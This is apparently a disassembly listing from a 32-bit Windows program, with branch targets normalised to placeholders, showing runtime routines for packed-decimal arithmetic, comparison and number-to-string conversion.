mov [ eax + 0x1 ] 0x80
jmp r-xdata
mov edx edi
sub al dl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
mov edx edi
sub al dl
add al 0x80
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
sub_482ea4
push ebp
mov ebp esp
push ecx
push esi
push ebx
mov esi [ ebp + 0xc ]
mov cx [ ebp + 0x8 ]
cld
mov [ ebp - 0x2 ] cx
pop ebx
pop esi
mov ax [ ebp - 0x2 ]
pop ecx
pop ebp
retn 0x8
lodsb [ esi ]
cmp al 0x0
jne r-xdata
shr al 0x4
cmp al 0x0
jne r-xdata
sub cx 0x1
cmp cx 0x0
je r-xdata
sub cx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_482ee8
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
sub dl al
call sub_482aa8
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
sub dl al
call sub_482aa8
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_482fa0
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
add dl al
call sub_482a98
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
add dl al
call sub_482a98
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_483058
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push edx
mov cx [ ebp + 0xc ]
mov dx [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x0
cld
cmp dx 0x0
jle r-xdata
lodsb [ esi ]
mov ah [ edi ]
inc edi
cmp al ah
jne r-xdata
pop edx
pop ebx
pop edi
pop esi
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x10
mov ah [ edi ]
inc edi
sub dx 0x2
cmp ah 0x0
je r-xdata
mov bl ah
mov ah al
shr ah 0x4
mov bh bl
shr bh 0x4
cmp bh ah
jne r-xdata
sub cx 0x1
sub dx 0x1
cmp cx 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp bh ah
ja r-xdata
cmp cx 0x0
je r-xdata
sub cx 0x1
sub dx 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov ah al
mov bh bl
and ah 0xf
and bh 0xf
cmp cx 0x0
je r-xdata
sub_48310c
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov esi eax
xor edi edi
mov ebp edx
mov eax [ esi ]
mov dl [ eax ]
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp edi eax
jl r-xdata
mov al [ ebp ]
and dl 0xf
shl edx 0x4
xor ecx ecx
mov cl al
shr ecx 0x4
or dl cl
mov ecx [ esi ]
mov [ ecx ] dl
mov edx eax
inc [ esi ]
inc ebp
add edi 0x2
pop edx
pop ebp
pop edi
pop esi
retn
sub_48314c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov esi edx
mov edi eax
mov [ ebp - 0x3 ] 0x1
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jne r-xdata
mov al [ edi + 0x1 ]
test al 0x80
setne [ ebp - 0xb ]
and al 0x3f
and eax 0xff
mov [ ebp - 0xa ] ax
mov al [ ebp - 0x2 ]
mov [ esi ] al
mov al [ ebp + 0x8 ]
mov [ esi + 0x1 ] al
lea eax [ edi + 0x2 ]
mov [ ebp - 0x8 ] eax
lea ebx [ esi + 0x2 ]
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402c68
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jbe r-xdata
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
cmp ax [ ebp + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov al [ ebp - 0xa ]
mov dl [ edi ]
sub dl al
push edx
push eax
mov al [ ebp - 0x2 ]
mov dl [ ebp + 0x8 ]
and dl 0x3f
sub al dl
push eax
mov al [ ebp + 0x8 ]
and al 0x3f
push eax
push ebx
call sub_482b00
cmp [ ebp - 0xb ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor eax eax
mov al [ edi ]
push eax
call sub_482ea4
cmp ax [ ebp - 0x2 ]
jbe r-xdata
push esi
mov eax edi
mov edi esi
mov esi eax
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
xor edx edx
mov dl [ esi ]
mov eax edx
shr eax 0x1
and edx 0x1
cmp edx 0x1
jne r-xdata
test [ esi + 0x1 ] 0x80
jne r-xdata
mov [ ebp - 0x3 ] 0x0
jmp r-xdata
movsx eax ax
cmp eax 0x1f
jg r-xdata
inc eax
mov al [ esi + 0x1 ]
call sub_483100
mov [ esi + 0x1 ] al
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_483278
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
mov al [ esi ]
xor edx edx
mov dl al
cmp edi edx
jl r-xdata
mov [ ebx ] al
mov al [ esi + 0x1 ]
mov [ ebx + 0x1 ] al
lea ebp [ ebx + 0x2 ]
mov eax ebp
xor ecx ecx
mov edx 0x20
call sub_402c68
lea eax [ esi + 0x2 ]
mov esi eax
jmp r-xdata
mov edi ebx
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp edi eax
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_483d40
movzx eax ax
xor edx edx
mov dl [ ebx ]
add eax edx
add eax 0x2
shr eax 0x1
cmp eax 0x20
jle r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx ebp
mov ecx esi
xchg ecx eax
call sub_4029c0
mov eax 0x20
sub [ ebx ] 0x2
inc esi
sub_4832f8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx edx
mov edi ebx
lea esi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
mov al [ ebp - 0x26 ]
and eax 0x1
test eax eax
je r-xdata
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov al [ ebx ]
shr eax 0x1
cmp eax 0x1f
jg r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ ebx + 0x2 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov dl [ ebp - 0x26 ]
inc edx
mov [ ebx ] dl
lea edx [ ebp - 0x4 ]
mov cl [ ebp - 0x26 ]
xchg edx eax
call sub_48310c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ edx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_483374
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
lea edx [ ebp - 0x26 ]
mov eax ebx
call sub_4832f8
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_4832f8
cmp [ ebp - 0x26 ] 0x20
ja r-xdata
mov eax esi
call sub_48325c
push eax
mov eax ebx
call sub_48325c
pop edx
call sub_42b20c
mov ebx eax
xor eax eax
mov al [ ebp - 0x26 ]
cmp bx ax
jae r-xdata
cmp [ ebp - 0x48 ] 0x20
jbe r-xdata
xor eax eax
mov al [ ebp - 0x48 ]
cmp bx ax
jae r-xdata
mov ebx eax
xor edx edx
mov dl [ ebp - 0x48 ]
xor eax eax
mov al [ ebp - 0x26 ]
call sub_42b20c
mov ebx eax
lea eax [ ebp - 0x48 ]
call sub_483d40
movzx eax ax
push eax
lea eax [ ebp - 0x26 ]
call sub_483d40
movzx eax ax
pop edx
call sub_42b20c
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x6c ]
movzx esi bx
mov edx esi
lea eax [ ebp - 0x26 ]
call sub_483278
push esi
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x6c ]
mov edx esi
lea eax [ ebp - 0x48 ]
call sub_483278
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x48 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx eax
cmp bx 0x40
jae r-xdata
push esi
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x26 ]
mov ecx ebx
call sub_48314c
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x48 ]
mov ecx ebx
call sub_48314c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x26 ]
call sub_483d40
movzx eax ax
xor edx edx
mov dl [ ebp - 0x26 ]
sub edx eax
movzx edi bx
movzx eax si
sub edi eax
cmp edx edi
jg r-xdata
add bx 0x2
lea eax [ ebp - 0x48 ]
call sub_483d40
movzx eax ax
xor edx edx
mov dl [ ebp - 0x48 ]
sub edx eax
cmp edi edx
jl r-xdata
sub_4834a8
push ebx
push esi
push edi
push ebp
add esp 0xffffffb8
mov esi edx
mov edi eax
mov al [ edi + 0x1 ]
and al 0x80
mov dl [ esi + 0x1 ]
and dl 0x80
cmp al dl
je r-xdata
test al al
setne [ esp + 0x1 ]
lea ebp [ edi + 0x2 ]
lea ebx [ esi + 0x2 ]
push ebp
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ edi ]
sub dx ax
push edx
call sub_482ea4
mov [ esp ] al
push ebx
mov al [ esi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ esi ]
sub dx ax
push edx
call sub_482ea4
cmp al [ esp ]
je r-xdata
test al al
je r-xdata
lea eax [ esp + 0x24 ]
push eax
push 0x0
lea ecx [ esp + 0xa ]
mov edx esi
mov eax edi
call sub_483374
lea ebp [ esp + 0x4 ]
lea ebx [ esp + 0x26 ]
push ebp
push ebx
xor eax eax
mov al [ esp + 0xa ]
push eax
xor eax eax
mov al [ esp + 0x30 ]
push eax
call sub_483058
cmp al [ esp ]
jge r-xdata
mov eax 0x1
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
add esp 0x48
pop ebp
pop edi
pop esi
pop ebx
retn
neg eax
or eax 0xffffffff
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x1 ] 0x0
je r-xdata
sub_483570
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi ecx
mov ebx eax
push esi
mov esi edx
lea edi [ esp + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
call sub_483100
mov [ esp + 0x1 ] al
mov ecx esi
mov edx esp
mov eax ebx
call sub_4838cc
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_4835ac
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404454
mov eax [ ebp - 0x8 ]
call sub_404454
xor eax eax
push ebp
push sub_483695
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_404464
cmp [ eax ] 0x2d
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404464
cmp [ eax ] 0x2d
jne r-xdata
inc ebx
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044c4
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48229c
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
call sub_48142c
push esi
mov edi esi
lea esi [ ebp - 0x30 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
and ebx 0x80000001
jns r-xdata
inc ebx
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4044c4
test ebx ebx
je r-xdata
dec ebx
or ebx 0xfffffffe
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48369c
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc8
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_4836a4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_483700
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_483bfc
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_483bfc
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_4835ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483707
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_483710
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404454
mov eax [ ebp - 0x8 ]
call sub_404454
xor eax eax
push ebp
push sub_483846
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043b0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x10 ]
call sub_480be8
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404464
cmp [ eax ] 0x2d
jne r-xdata
mov bl 0xa
xor edi edi
mov bl [ esi + 0x1 ]
and bl 0x3f
test bl bl
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404464
cmp [ eax ] 0x2d
jne r-xdata
inc edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044c4
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48297c
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
xor edx edx
mov dl bl
call sub_4814e0
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_48142c
push esi
push edi
mov edi esi
lea esi [ ebp - 0x38 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop edi
pop esi
and edi 0x80000001
jns r-xdata
inc edi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404264
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4044c4
test edi edi
je r-xdata
dec edi
or edi 0xfffffffe
inc edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48384d
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403fc8
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_483860
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4838bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_483bfc
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_483bfc
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_483710
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4838c3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_4838cc
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov esi ecx
mov [ esp ] edx
mov ebx eax
lea eax [ esp + 0x2f ]
push eax
push 0x1
lea ecx [ esp + 0x15 ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_483374
movzx ebp [ esp + 0xd ]
movzx edi [ esp + 0xe ]
test [ ebx + 0x1 ] 0x80
setne al
mov ebx eax
mov eax [ esp ]
test [ eax + 0x1 ] 0x80
setne [ esp + 0xc ]
mov eax ebp
mov [ esi ] al
cmp bl [ esp + 0xc ]
je r-xdata
mov eax edi
mov [ esi + 0x1 ] al
jmp r-xdata
mov al [ esp + 0xe ]
and al 0x3f
mov dl [ esp + 0x30 ]
and dl 0x3f
cmp al dl
jb r-xdata
lea eax [ esp + 0xf ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x31 ]
mov [ esp + 0x8 ] eax
lea edi [ esi + 0x2 ]
mov eax edi
xor ecx ecx
mov edx 0x20
call sub_402c68
cmp bl [ esp + 0xc ]
jne r-xdata
mov eax edi
call sub_483100
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
push ebp
call sub_482ea4
movzx ebx ax
mov eax [ esp + 0x8 ]
push eax
push ebp
call sub_482ea4
movzx eax ax
cmp eax ebx
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_482fa0
jmp r-xdata
cmp ebx eax
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_482ee8
jmp r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push ebp
push ebp
call sub_483058
test eax eax
jl r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_482ee8
mov al [ esi + 0x1 ]
call sub_483100
mov [ esi + 0x1 ] al
jmp r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_482ee8
mov al [ esi + 0x1 ]
call sub_483100
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_482ee8
jmp r-xdata
sub_483a38
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
movsx edx [ edx - 0x9 ]
cmp eax edx
je r-xdata
test bl bl
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebx + 0x30 ]
call sub_483a1c
pop ecx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x11 ]
call sub_483a1c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov al 0x30
call sub_483a1c
pop ecx
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
pop ebx
pop ebp
retn
sub_483ab4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x14 ] dx
mov edi eax
movsx eax [ ebp - 0x14 ]
add eax 0x3
call sub_408034
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_483ba3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
movsx esi [ ebp - 0x14 ]
cmp esi [ ebp - 0x10 ]
jg r-xdata
push ebp
xor eax eax
mov al [ edi + ebx ]
shr eax 0x4
call sub_483a38
pop ecx
cmp esi [ ebp - 0x10 ]
jle r-xdata
jmp r-xdata
inc ebx
push ebp
mov al [ edi + ebx ]
and al 0xf
call sub_483a38
pop ecx
cmp [ ebp - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
movsx eax [ ebp - 0x9 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_404094
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483baa
movsx edx [ ebp - 0x14 ]
add edx 0x2
mov eax [ ebp - 0x18 ]
call sub_4027e4
retn
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x1
jg r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x30
jne r-xdata
dec [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
sub_483baa
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_403ff8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_4042b0
sub_483bfc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_483cfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx ]
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x10 ]
call sub_480c00
jmp r-xdata
cmp al 0x40
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483d02
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
mov dl [ ebx + 0x1 ]
test dl 0x80
setne [ ebp - 0x9 ]
mov esi eax
and esi 0xff
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x8 ] eax
and dl 0x3f
test dl dl
jbe r-xdata
mov edi esi
inc edi
mov eax esi
mov dl [ ebx + 0x1 ]
and dl 0x3f
sub al dl
movsx edi al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_4043b0
je r-xdata
sub al 0x3
jne r-xdata
mov al [ ebp - 0x9 ]
push eax
mov al [ ebx + 0x1 ]
and al 0x3f
and eax 0xff
cmp esi eax
sete al
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_483ab4
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x2d
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403ff8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_4043b0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_4043b0
jne r-xdata
sub_483d4c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi eax
xchg edx ecx
mov [ esi ] cl
mov [ esi + 0x1 ] dl
sub edx 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
or ebx ebx
jns r-xdata
ja r-xdata
mov edi 0xa
neg ebx
neg eax
sbb ebx 0x0
or [ esi + 0x1 ] 0x80
dec ecx
mov [ ecx + ebp - 0x40 ] 0x0
dec edx
jne r-xdata
fild [ ebp + 0x8 ]
fdiv [ edx * 4 + rw-data ]
fistp [ ebp + 0x8 ]
jmp r-xdata
mov [ ecx + ebp - 0x41 ] dl
dec ecx
jne r-xdata
xor edx edx
or ebx ebx
je r-xdata
mov edx eax
or edx ebx
je r-xdata
or eax ebx
mov al 0x0
jne r-xdata
div edi
xchg ebx eax
div edi
xchg ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov cl [ esi ]
inc ecx
shr ecx 0x1
mov ax [ ebp + ecx * 2 - 0x42 ]
shl al 0x4
or al ah
mov [ esi + ecx + 0x1 ] al
dec ecx
jne r-xdata
mov al 0x1
sub_483dd8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push edi
push esi
xor ebx ebx
mov edi eax
mov esi edx
mov al 0x0
movzx edx [ edi ]
or edx edx
je r-xdata
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x1 ]
shr ecx 0x1
mov al [ edi + ecx + 0x1 ]
mov ah al
shr al 0x4
and ah 0xf
mov [ ebp + ecx * 2 - 0x42 ] ax
dec ecx
jne r-xdata
xor eax eax
mov [ ebp - 0x44 ] eax
fild [ ebp - 0x44 ]
inc ecx
cmp ecx edx
jne r-xdata
mov al [ edi + 0x1 ]
or al al
jns r-xdata
fmul [ ebx + rw-data ]
mov al [ ecx + ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
fiadd [ ebp - 0x44 ]
jmp r-xdata
mov al [ ecx + ebp - 0x40 ]
or al al
jne r-xdata
fldz
jmp r-xdata
and eax 0x3f
sub eax 0x4
neg eax
call j_sub_402da8
fchs
inc ecx
cmp ecx edx
je r-xdata
fwait
fnstcw [ ebp - 0x46 ]
fldcw [ ebx + rw-data ]
fistp [ esi ]
fwait
fnstsw ax
not al
and al 0x1
fwait
fnclex
fldcw [ ebp - 0x46 ]
fwait
sub_483e70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_483ea1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483ea8
retn
mov eax rw-data
call sub_40d788
sub_484157
dec [ ebx ]
add [ eax ] al
add [ esi + 0x4d ] al
push esp
inc edx
arpl [ esi + eax * 2 + 0x69 ] sp
insb
